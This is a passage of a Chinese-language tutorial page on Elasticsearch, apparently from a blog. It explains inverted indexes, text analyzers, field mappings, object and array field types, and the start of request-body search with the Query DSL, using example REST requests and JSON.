 |   X   |</span><br><span class="line">------------------------</span><br></pre></td></tr></table></figure></p>
<p>现在，如果我们想搜索 quick brown ，我们只需要查找包含每个词条的文档：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Term      Doc_1  Doc_2</span><br><span class="line">-------------------------</span><br><span class="line">brown   |   X   |  X</span><br><span class="line">quick   |   X   |</span><br><span class="line">------------------------</span><br><span class="line">Total   |   2   |  1</span><br></pre></td></tr></table></figure></p>
<p>两个文档都匹配，但是第一个文档比第二个匹配度更高。如果我们使用仅计算匹配词条数量的简单 相似性算法 ，那么，我们可以说，对于我们查询的相关性来讲，第一个文档比第二个文档更佳。</p>
<p>但是，我们目前的倒排索引有一些问题：<br>1.Quick 和 quick 以独立的词条出现，然而用户可能认为它们是相同的词。<br>2.fox 和 foxes 非常相似, 就像 dog 和 dogs ；他们有相同的词根。<br>3.jumped 和 leap, 尽管没有相同的词根，但他们的意思很相近。他们是同义词。</p>
<p>使用前面的索引搜索 +Quick +fox 不会得到任何匹配文档。（记住，+ 前缀表明这个词必须存在。）只有同时出现 Quick 和 fox 的文档才满足这个查询条件，但是第一个文档包含 quick fox ，第二个文档包含 Quick foxes 。</p>
<p>我们的用户可以合理的期望两个文档与查询匹配。我们可以做的更好。</p>
<p>如果我们将词条规范为标准模式，那么我们可以找到与用户搜索的词条不完全一致，但具有足够相关性的文档。例如：</p>
<p>Quick 可以小写化为 quick 。<br>foxes 可以 词干提取 –变为词根的格式– 为 fox 。类似的， dogs 可以为提取为 dog 。<br>jumped 和 leap 是同义词，可以索引为相同的单词 jump 。</p>
<p>现在索引看上去像这样：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Term      Doc_1  Doc_2</span><br><span class="line">-------------------------</span><br><span class="line">brown   |   X   |  X</span><br><span class="line">dog     |   X   |  X</span><br><span class="line">fox     |   X   |  X</span><br><span class="line">in      |       |  X</span><br><span class="line">jump    |   X   |  X</span><br><span class="line">lazy    |   X   |  X</span><br><span class="line">over    |   X   |  X</span><br><span class="line">quick   |   X   |  X</span><br><span class="line">summer  |       |  X</span><br><span class="line">the     |   X   |  X</span><br><span class="line">------------------------</span><br></pre></td></tr></table></figure>
<p>这还远远不够。我们搜索 +Quick +fox 仍然 会失败，因为在我们的索引中，已经没有 Quick 了。但是，如果我们对搜索的字符串使用与 content 域相同的标准化规则，会变成查询 +quick +fox ，这样两个文档都会匹配！</p>
<p>这非常重要。你只能搜索在索引中出现的词条，所以索引文本和查询字符串必须标准化为相同的格式。</p>
<p>分词和标准化的过程称为 分析 ， 我们会在下个章节讨论。</p>
<h2 id="分析与分析器"><a href="#分析与分析器" class="headerlink" title="分析与分析器"></a>分析与分析器</h2><p>分析 包含下面的过程：<br>首先，将一块文本分成适合于倒排索引的独立的 词条 ，<br>之后，将这些词条统一化为标准格式以提高它们的“可搜索性”，或者 recall</p>
<p>分析器执行上面的工作。 分析器 实际上是将三个功能封装到了一个包里：<br>字符过滤器<br>   首先，字符串按顺序通过每个 字符过滤器 。他们的任务是在分词前整理字符串。一个字符过滤器可以用来去掉HTML，或者将 &amp; 转化成 <code>and</code>。<br>分词器<br>   其次，字符串被 分词器 分为单个的词条。一个简单的分词器遇到空格和标点的时候，可能会将文本拆分成词条。<br>Token 过滤器<br>   最后，词条按顺序通过每个 token 过滤器 。这个过程可能会改变词条（例如，小写化 Quick ），删除词条（例如， 像 a<code>，</code>and<code>，</code>the 等无用词），或者增加词条（例如，像 jump 和 leap 这种同义词）。</p>
<p>Elasticsearch提供了开箱即用的字符过滤器、分词器和token 过滤器。 这些可以组合起来形成自定义的分析器以用于不同的目的。我们会在 自定义分析器 章节详细讨论。</p>
<p>内置分析器<br>但是， Elasticsearch还附带了可以直接使用的预包装的分析器。 接下来我们会列出最重要的分析器。为了证明它们的差异，我们看看每个分析器会从下面的字符串得到哪些词条：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;Set the shape to semi-transparent by calling set_trans(5)&quot;</span><br></pre></td></tr></table></figure></p>
<p>标准分析器<br>标准分析器是Elasticsearch默认使用的分析器。它是分析各种语言文本最常用的选择。它根据 Unicode 联盟 定义的 单词边界 划分文本。删除绝大部分标点。最后，将词条小写。它会产生<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set, the, shape, to, semi, transparent, by, calling, set_trans, 5</span><br></pre></td></tr></table></figure></p>
<p>简单分析器<br>简单分析器在任何不是字母的地方分隔文本，将词条小写。它会产生<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set, the, shape, to, semi, transparent, by, calling, set, trans</span><br></pre></td></tr></table></figure></p>
<p>空格分析器<br>空格分析器在空格的地方划分文本。它会产生<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Set, the, shape, to, semi-transparent, by, calling, set_trans(5)</span><br></pre></td></tr></table></figure></p>
<p>语言分析器<br>特定语言分析器可用于 很多语言。它们可以考虑指定语言的特点。例如， 英语 分析器附带了一组英语无用词（常用单词，例如 and 或者 the ，它们对相关性没有多少影响），它们会被删除。 由于理解英语语法的规则，这个分词器可以提取英语单词的 词干 。英语分词器会产生下面的词条：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set, shape, semi, transpar, call, set_tran, 5</span><br></pre></td></tr></table></figure></p>
<p>注意看 transparent、calling 和 set_trans 已经变为词根格式</p>
<p>什么时候使用分析器</p>
<p>当我们 索引 一个文档，它的全文域被分析成词条以用来创建倒排索引。 但是，当我们在全文域 搜索 的时候，我们需要将查询字符串通过 相同的分析过程 ，以保证我们搜索的词条格式与索引中的词条格式一致。</p>
<p>全文查询，理解每个域是如何定义的，因此它们可以做 正确的事：<br>.当你查询一个 全文 域时， 会对查询字符串应用相同的分析器，以产生正确的搜索词条列表。<br>.当你查询一个 精确值 域时，不会分析查询字符串， 而是搜索你指定的精确值。</p>
<p>现在你可以理解在 开始章节 的查询为什么返回那样的结果：<br>.date 域包含一个精确值：单独的词条 2014-09-15。<br>._all 域是一个全文域，所以分词进程将日期转化为三个词条： 2014，09和15。</p>
<p>当我们在 _all 域查询 2014，它匹配所有的12条推文，因为它们都含有 2014 ：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GET /_search?q=2014              # 12 results</span><br></pre></td></tr></table></figure></p>
<p>当我们在 _all 域查询 2014-09-15，它首先分析查询字符串，产生匹配2014，09， 或 15 中 任意 词条的查询。这也会匹配所有12条推文，因为它们都含有 2014 ：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET /_search?q=2014-09-15        # 12 results !</span><br></pre></td></tr></table></figure></p>
<p>当我们在 date 域查询 2014-09-15，它寻找 精确 日期，只找到一个推文：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET /_search?q=date:2014-09-15   # 1  result</span><br></pre></td></tr></table></figure></p>
<p>当我们在 date 域查询 <code>2014</code>，它找不到任何文档，因为没有文档含有这个精确日志：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET /_search?q=date:2014         # 0  results !</span><br></pre></td></tr></table></figure></p>
<p>测试分析器<br>有些时候很难理解分词的过程和实际被存储到索引中的词条，特别是你刚接触 Elasticsearch。为了理解发生了什么，你可以使用 analyze API 来看文本是如何被分析的。在消息体里，指定分析器和要分析的文本：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GET /_analyze</span><br><span class="line">&#123;</span><br><span class="line">  "analyzer": "standard",</span><br><span class="line">  "text": "Text to analyze"</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>结果中每个元素代表一个单独的词条：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   <span class="attr">"tokens"</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="attr">"token"</span>:        <span class="string">"text"</span>,</span><br><span class="line">         <span class="attr">"start_offset"</span>: <span class="number">0</span>,</span><br><span class="line">         <span class="attr">"end_offset"</span>:   <span class="number">4</span>,</span><br><span class="line">         <span class="attr">"type"</span>:         <span class="string">"&lt;ALPHANUM&gt;"</span>,</span><br><span class="line">         <span class="attr">"position"</span>:     <span class="number">1</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="attr">"token"</span>:        <span class="string">"to"</span>,</span><br><span class="line">         <span class="attr">"start_offset"</span>: <span class="number">5</span>,</span><br><span class="line">         <span class="attr">"end_offset"</span>:   <span class="number">7</span>,</span><br><span class="line">         <span class="attr">"type"</span>:         <span class="string">"&lt;ALPHANUM&gt;"</span>,</span><br><span class="line">         <span class="attr">"position"</span>:     <span class="number">2</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="attr">"token"</span>:        <span class="string">"analyze"</span>,</span><br><span class="line">         <span class="attr">"start_offset"</span>: <span class="number">8</span>,</span><br><span class="line">         <span class="attr">"end_offset"</span>:   <span class="number">15</span>,</span><br><span class="line">         <span class="attr">"type"</span>:         <span class="string">"&lt;ALPHANUM&gt;"</span>,</span><br><span class="line">         <span class="attr">"position"</span>:     <span class="number">3</span></span><br><span class="line">      &#125;</span><br><span class="line">   ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>token 是实际存储到索引中的词条。 position 指明词条在原始文本中出现的位置。 start_offset 和 end_offset 指明字符在原始字符串中的位置。</p>
<p>每个分析器的 type 值都不一样，可以忽略它们。它们在Elasticsearch中的唯一作用在于keep_types token 过滤器。</p>
<p>指定分析器编辑</p>
<p>当Elasticsearch在你的文档中检测到一个新的字符串域 ，它会自动设置其为一个全文 字符串 域，使用 标准 分析器对它进行分析。</p>
<p>你不希望总是这样。可能你想使用一个不同的分析器，适用于你的数据使用的语言。有时候你想要一个字符串域就是一个字符串域–不使用分析，直接索引你传入的精确值，例如用户ID或者一个内部的状态域或标签。要做到这一点，我们必须手动指定这些域的映射。</p>
<h2 id="映射"><a href="#映射" class="headerlink" title="映射"></a>映射</h2><p>为了能够将时间域视为时间，数字域视为数字，字符串域视为全文或精确值字符串， Elasticsearch 需要知道每个域中数据的类型。这个信息包含在映射中。</p>
<p>如 数据输入和输出 中解释的， 索引中每个文档都有 类型 。每种类型都有它自己的 映射 ，或者 模式定义 。映射定义了类型中的域，每个域的数据类型，以及Elasticsearch如何处理这些域。映射也用于配置与类型有关的元数据。</p>
<p>核心简单域类型编辑</p>
<p>Elasticsearch 支持 如下简单域类型：<br>字符串: string<br>整数 : byte, short, integer, long<br>浮点数: float, double<br>布尔型: boolean<br>日期: date</p>
<p>当你索引一个包含新域的文档–之前未曾出现– Elasticsearch 会使用 动态映射 ，通过JSON中基本数据类型，尝试猜测域类型，使用如下规则：</p>
<table>
<thead>
<tr>
<th>JSON type</th>
<th>域 type</th>
</tr>
</thead>
<tbody>
<tr>
<td>布尔型: true 或者 false</td>
<td>boolean</td>
</tr>
<tr>
<td>整数: 123</td>
<td>long</td>
</tr>
<tr>
<td>浮点数: 123.45</td>
<td>double</td>
</tr>
<tr>
<td>字符串，有效日期: 2014-09-15</td>
<td>date</td>
</tr>
<tr>
<td>字符串: foo bar</td>
<td>string</td>
</tr>
</tbody>
</table>
<p>这意味着如果你通过引号( “123” )索引一个数字，它会被映射为 string 类型，而不是 long 。但是，如果这个域已经映射为 long ，那么 Elasticsearch 会尝试将这个字符串转化为 long ，如果无法转化，则抛出一个异常。</p>
<p>查看映射编辑</p>
<p>通过 /_mapping ，我们可以查看 Elasticsearch 在一个或多个索引中的一个或多个类型的映射 。在开始章节 ，我们已经取得索引 gb 中类型 tweet 的映射：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GET /gb/_mapping/tweet</span><br></pre></td></tr></table></figure></p>
<p>Elasticsearch 根据我们索引的文档，为域(称为 属性 )动态生成的映射。<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   <span class="attr">"gb"</span>: &#123;</span><br><span class="line">      <span class="attr">"mappings"</span>: &#123;</span><br><span class="line">         <span class="attr">"tweet"</span>: &#123;</span><br><span class="line">            <span class="attr">"properties"</span>: &#123;</span><br><span class="line">               <span class="attr">"date"</span>: &#123;</span><br><span class="line">                  <span class="attr">"type"</span>: <span class="string">"date"</span>,</span><br><span class="line">                  <span class="attr">"format"</span>: <span class="string">"strict_date_optional_time||epoch_millis"</span></span><br><span class="line">               &#125;,</span><br><span class="line">               <span class="attr">"name"</span>: &#123;</span><br><span class="line">                  <span class="attr">"type"</span>: <span class="string">"string"</span></span><br><span class="line">               &#125;,</span><br><span class="line">               <span class="attr">"tweet"</span>: &#123;</span><br><span class="line">                  <span class="attr">"type"</span>: <span class="string">"string"</span></span><br><span class="line">               &#125;,</span><br><span class="line">               <span class="attr">"user_id"</span>: &#123;</span><br><span class="line">                  <span class="attr">"type"</span>: <span class="string">"long"</span></span><br><span class="line">               &#125;</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>错误的映射，例如 将 age 域映射为 string 类型，而不是 integer ，会导致查询出现令人困惑的结果。检查一下！而不是假设你的映射是正确的。</p>
<p>自定义域映射编辑</p>
<p>尽管在很多情况下基本域数据类型 已经够用，但你经常需要为单独域自定义映射 ，特别是字符串域。自定义映射允许你执行下面的操作：</p>
<p>.全文字符串域和精确值字符串域的区别<br>.使用特定语言分析器<br>.优化域以适应部分匹配<br>.指定自定义数据格式<br>.还有更多</p>
<p>域最重要的属性是 type 。对于不是 string 的域，你一般只需要设置 type ：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"number_of_clicks"</span>: &#123;</span><br><span class="line">        <span class="attr">"type"</span>: <span class="string">"integer"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>默认， string 类型域会被认为包含全文。就是说，它们的值在索引前，会通过一个分析器，针对于这个域的查询在搜索前也会经过一个分析器。</p>
<p>string 域映射的两个最重要 属性是 index 和 analyzer 。</p>
<p>index</p>
<p>index 属性控制怎样索引字符串。它可以是下面三个值：</p>
<p>1.analyzed<br>   首先分析字符串，然后索引它。换句话说，以全文索引这个域。<br>2.not_analyzed<br>   索引这个域，所以它能够被搜索，但索引的是精确值。不会对它进行分析。<br>3.no<br>   不索引这个域。这个域不会被搜索到。</p>
<p>string 域 index 属性默认是 analyzed 。如果我们想映射这个字段为一个精确值，我们需要设置它为 not_analyzed<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"tag"</span>: &#123;</span><br><span class="line">        <span class="attr">"type"</span>:     <span class="string">"string"</span>,</span><br><span class="line">        <span class="attr">"index"</span>:    <span class="string">"not_analyzed"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>其他简单类型（例如 long ， double ， date 等）也接受 index 参数，但有意义的值只有 no 和 not_analyzed ， 因为它们永远不会被分析。</p>
<p>analyzer</p>
<p>对于analyzed字符串域，用analyzer属性指定在搜索和索引时使用的分析器。默认，Elasticsearch 使用 standard 分析器， 但你可以指定一个内置的分析器替代它，例如 whitespace 、 simple 和 english：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"tweet"</span>: &#123;</span><br><span class="line">        <span class="attr">"type"</span>:     <span class="string">"string"</span>,</span><br><span class="line">        <span class="attr">"analyzer"</span>: <span class="string">"english"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>更新映射<br>当你首次 创建一个索引的时候，可以指定类型的映射。你也可以使用 /_mapping 为新类型（或者为存在的类型更新映射）增加映射。</p>
<p>注意,尽管你可以增加一个存在的映射，你不能修改存在的域映射。如果一个域的映射已经存在，那么该域的数据可能已经被索引。如果你意图修改这个域的映射，索引的数据可能会出错，不能被正常的搜索。</p>
<p>我们可以更新一个映射来添加一个新域，但不能将一个存在的域从 analyzed 改为 not_analyzed 。为了描述指定映射的两种方式，我们先删除 gd 索引：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">DELETE /gb</span><br></pre></td></tr></table></figure></p>
<p>然后创建一个新索引，指定 tweet 域使用 english 分析器：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PUT /gb </span><br><span class="line">&#123;</span><br><span class="line">  "mappings": &#123;</span><br><span class="line">    "tweet" : &#123;</span><br><span class="line">      "properties" : &#123;</span><br><span class="line">        "tweet" : &#123;</span><br><span class="line">          "type" :    "string",</span><br><span class="line">          "analyzer": "english"</span><br><span class="line">        &#125;,</span><br><span class="line">        "date" : &#123;</span><br><span class="line">          "type" :   "date"</span><br><span class="line">        &#125;,</span><br><span class="line">        "name" : &#123;</span><br><span class="line">          "type" :   "string"</span><br><span class="line">        &#125;,</span><br><span class="line">        "user_id" : &#123;</span><br><span class="line">          "type" :   "long"</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>稍后，我们决定在 tweet 映射增加一个新的名为 tag 的 not_analyzed 的文本域，使用 _mapping ：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PUT /gb/_mapping/tweet</span><br><span class="line">&#123;</span><br><span class="line">  "properties" : &#123;</span><br><span class="line">    "tag" : &#123;</span><br><span class="line">      "type" :    "string",</span><br><span class="line">      "index":    "not_analyzed"</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>注意，我们不需要再次列出所有已存在的域，因为无论如何我们都无法改变它们。新域已经被合并到存在的映射中。</p>
<p>测试映射</p>
<p>你可以使用 analyze API 测试字符串域的映射。比较下面两个请求的输出：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GET /gb/_analyze</span><br><span class="line">&#123;</span><br><span class="line">  "field": "tweet",</span><br><span class="line">  "text": "Black-cats" </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">GET /gb/_analyze</span><br><span class="line">&#123;</span><br><span class="line">  "field": "tag",</span><br><span class="line">  "text": "Black-cats" </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>tweet 域产生两个词条 black 和 cat ， tag 域产生单独的词条 Black-cats 。换句话说，我们的映射正常工作。</p>
<h2 id="复杂核心域类型"><a href="#复杂核心域类型" class="headerlink" title="复杂核心域类型"></a>复杂核心域类型</h2><p>除了我们提到的简单标量数据类型,JSON还有null值，数组，和对象，这些 Elasticsearch 都是支持的。</p>
<p>多值域</p>
<p>很有可能，我们希望 tag 域 包含多个标签。我们可以以数组的形式索引标签：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123; <span class="attr">"tag"</span>: [ <span class="string">"search"</span>, <span class="string">"nosql"</span> ]&#125;</span><br></pre></td></tr></table></figure></p>
<p>对于数组，没有特殊的映射需求。任何域都可以包含0、1或者多个值，就像全文域分析得到多个词条。</p>
<p>这暗示 数组中所有的值必须是相同数据类型的 。你不能将日期和字符串混在一起。如果你通过索引数组来创建新的域，Elasticsearch 会用数组中第一个值的数据类型作为这个域的 类型 。</p>
<p>当你从 Elasticsearch 得到一个文档，每个数组的顺序和你当初索引文档时一样。你得到的 _source 域，包含与你索引的一模一样的 JSON 文档。</p>
<p>但是，数组是以多值域 索引的—可以搜索，但是无序的。 在搜索的时候，你不能指定 “第一个” 或者 “最后一个”。 </p>
<p>空域</p>
<p>当然，数组可以为空。这相当于存在零值。事实上，在Lucene中是不能存储 null 值的，所以我们认为存在 null 值的域为空域。下面三种域被认为是空的，它们将不会被索引：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;null_value&quot;:               null,</span><br><span class="line">&quot;empty_array&quot;:              [],</span><br><span class="line">&quot;array_with_null_value&quot;:    [ null ]</span><br></pre></td></tr></table></figure></p>
<p>多层级对象</p>
<p>我们讨论的最后一个 JSON 原生数据类是 对象 – 在其他语言中称为哈希，哈希 map，字典或者关联数组。</p>
<p>内部对象 经常用于 嵌入一个实体或对象到其它对象中。例如，与其在 tweet 文档中包含 user_name 和 user_id 域，我们也可以这样写：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"tweet"</span>:            <span class="string">"Elasticsearch is very flexible"</span>,</span><br><span class="line">    <span class="attr">"user"</span>: &#123;</span><br><span class="line">        <span class="attr">"id"</span>:           <span class="string">"@johnsmith"</span>,</span><br><span class="line">        <span class="attr">"gender"</span>:       <span class="string">"male"</span>,</span><br><span class="line">        <span class="attr">"age"</span>:          <span class="number">26</span>,</span><br><span class="line">        <span class="attr">"name"</span>: &#123;</span><br><span class="line">            <span class="attr">"full"</span>:     <span class="string">"John Smith"</span>,</span><br><span class="line">            <span class="attr">"first"</span>:    <span class="string">"John"</span>,</span><br><span class="line">            <span class="attr">"last"</span>:     <span class="string">"Smith"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>内部对象的映射</p>
<p>Elasticsearch 会动态 监测新的对象域并映射它们为 对象 ，在 properties 属性下列出内部域：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"gb"</span>: &#123;</span><br><span class="line">    <span class="attr">"tweet"</span>: &#123; </span><br><span class="line">      <span class="attr">"properties"</span>: &#123;</span><br><span class="line">        <span class="attr">"tweet"</span>:            &#123; <span class="attr">"type"</span>: <span class="string">"string"</span> &#125;,</span><br><span class="line">        <span class="attr">"user"</span>: &#123; </span><br><span class="line">          <span class="attr">"type"</span>:             <span class="string">"object"</span>,</span><br><span class="line">          <span class="attr">"properties"</span>: &#123;</span><br><span class="line">            <span class="attr">"id"</span>:           &#123; <span class="attr">"type"</span>: <span class="string">"string"</span> &#125;,</span><br><span class="line">            <span class="attr">"gender"</span>:       &#123; <span class="attr">"type"</span>: <span class="string">"string"</span> &#125;,</span><br><span class="line">            <span class="attr">"age"</span>:          &#123; <span class="attr">"type"</span>: <span class="string">"long"</span>   &#125;,</span><br><span class="line">            <span class="attr">"name"</span>:   &#123; </span><br><span class="line">              <span class="attr">"type"</span>:         <span class="string">"object"</span>,</span><br><span class="line">              <span class="attr">"properties"</span>: &#123;</span><br><span class="line">                <span class="attr">"full"</span>:     &#123; <span class="attr">"type"</span>: <span class="string">"string"</span> &#125;,</span><br><span class="line">                <span class="attr">"first"</span>:    &#123; <span class="attr">"type"</span>: <span class="string">"string"</span> &#125;,</span><br><span class="line">                <span class="attr">"last"</span>:     &#123; <span class="attr">"type"</span>: <span class="string">"string"</span> &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>user 和 name 域的映射结构与 tweet 类型的相同。事实上， type 映射只是一种特殊的 对象 映射，我们称之为 根对象 。除了它有一些文档元数据的特殊顶级域，例如 _source 和 _all 域，它和其他对象一样。</p>
<p>内部对象是如何索引的</p>
<p>Lucene 不理解内部对象。 Lucene 文档是由一组键值对列表组成的。为了能让 Elasticsearch 有效地索引内部类，它把我们的文档转化成这样：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"tweet"</span>:            [elasticsearch, flexible, very],</span><br><span class="line">    <span class="attr">"user.id"</span>:          [@johnsmith],</span><br><span class="line">    <span class="attr">"user.gender"</span>:      [male],</span><br><span class="line">    <span class="attr">"user.age"</span>:         [<span class="number">26</span>],</span><br><span class="line">    <span class="attr">"user.name.full"</span>:   [john, smith],</span><br><span class="line">    <span class="attr">"user.name.first"</span>:  [john],</span><br><span class="line">    <span class="attr">"user.name.last"</span>:   [smith]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>内部域 可以通过名称引用（例如， first ）。为了区分同名的两个域，我们可以使用全 路径 （例如， user.name.first ） 或 type 名加路径（ tweet.user.name.first ）。</p>
<p>内部对象数组</p>
<p>最后，考虑包含 内部对象的数组是如何被索引的。 假设我们有个 followers 数组：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"followers"</span>: [</span><br><span class="line">        &#123; <span class="attr">"age"</span>: <span class="number">35</span>, <span class="attr">"name"</span>: <span class="string">"Mary White"</span>&#125;,</span><br><span class="line">        &#123; <span class="attr">"age"</span>: <span class="number">26</span>, <span class="attr">"name"</span>: <span class="string">"Alex Jones"</span>&#125;,</span><br><span class="line">        &#123; <span class="attr">"age"</span>: <span class="number">19</span>, <span class="attr">"name"</span>: <span class="string">"Lisa Smith"</span>&#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这个文档会像我们之前描述的那样被扁平化处理，结果如下所示：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"followers.age"</span>:    [<span class="number">19</span>, <span class="number">26</span>, <span class="number">35</span>],</span><br><span class="line">    <span class="attr">"followers.name"</span>:   [alex, jones, lisa, smith, mary, white]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>{age: 35} 和 {name: Mary White} 之间的相关性已经丢失了，因为每个多值域只是一包无序的值，而不是有序数组。这足以让我们问，“有一个26岁的追随者？”</p>
<p>但是我们不能得到一个准确的答案：“是否有一个26岁 名字叫 Alex Jones 的追随者？”</p>
<p>相关内部对象被称为 nested 对象，可以回答上面的查询，我们稍后会在嵌套对象中介绍它。</p>
<h1 id="请求体查询"><a href="#请求体查询" class="headerlink" title="请求体查询"></a>请求体查询</h1><p>简易 查询 —query-string search— 对于用命令行进行即席查询（ad-hoc）是非常有用的。 然而，为了充分利用查询的强大功能，你应该使用 请求体 search API， 之所以称之为请求体查询(Full-Body Search)，因为大部分参数是通过 Http 请求体而非查询字符串来传递的。</p>
<p>请求体查询 —下文简称 查询—不仅可以处理自身的查询请求，还允许你对结果进行片段强调（高亮）、对所有或部分结果进行聚合分析，同时还可以给出 你是不是想找 的建议，这些建议可以引导使用者快速找到他想要的结果。</p>
<h2 id="空查询编辑"><a href="#空查询编辑" class="headerlink" title="空查询编辑"></a>空查询编辑</h2><p>让我们以 最简单的 search API 的形式开启我们的旅程，空查询将返回所有索引库（indices)中的所有文档：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;&#125;</span><br></pre></td></tr></table></figure></p>
<p>只用一个查询字符串，你就可以在一个、多个或者 _all 索引库（indices）和一个、多个或者所有types中查询：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GET /index_2014*/type1,type2/_search</span><br><span class="line">&#123;&#125;</span><br></pre></td></tr></table></figure></p>
<p>同时你可以使用 from 和 size 参数来分页：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">  "from": 30,</span><br><span class="line">  "size": 10</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>注：一个带请求体的 GET 请求？</p>
<p>某些特定语言（特别是 JavaScript）的 HTTP 库是不允许 GET 请求带有请求体的。 事实上，一些使用者对于 GET 请求可以带请求体感到非常的吃惊。</p>
<p>而事实是这个RFC文档 RFC 7231— 一个专门负责处理 HTTP 语义和内容的文档 — 并没有规定一个带有请求体的 GET 请求应该如何处理！结果是，一些 HTTP 服务器允许这样子，而有一些 — 特别是一些用于缓存和代理的服务器 — 则不允许。</p>
<p>对于一个查询请求，Elasticsearch 的工程师偏向于使用 GET 方式，因为他们觉得它比 POST 能更好的描述信息检索（retrieving information）的行为。然而，因为带请求体的 GET 请求并不被广泛支持，所以 search API 同时支持 POST 请求：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">POST /_search</span><br><span class="line">&#123;</span><br><span class="line">  "from": 30,</span><br><span class="line">  "size": 10</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>类似的规则可以应用于任何需要带请求体的 GET API。</p>
<p>相对于使用晦涩难懂的查询字符串的方式，一个带请求体的查询允许我们使用 查询领域特定语言（query domain-specific language） 或者 Query DSL 来写查询语句。</p>
<h2 id="查询表达式"><a href="#查询表达式" class="headerlink" title="查询表达式"></a>查询表达式</h2><p>Elasticsearch 使用查询表达式(Query DSL)可以以简单的 JSON 接口来展现 Lucene 功能的绝大部分。在你的应用中，你应该用它来编写你的查询语句。它可以使你的查询语句更灵活、更精确、易读和易调试。</p>
<p>要使用这种查询表达式，只需将查询语句传递给 query 参数：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">    &quot;query&quot;: YOUR_QUERY_HERE</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>空查询（empty search） —{}— 在功能上等价于使用 match_all 查询， 正如其名字一样，匹配所有文档：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">    &quot;query&quot;: &#123;</span><br><span class="line">        &quot;match_all&quot;: &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
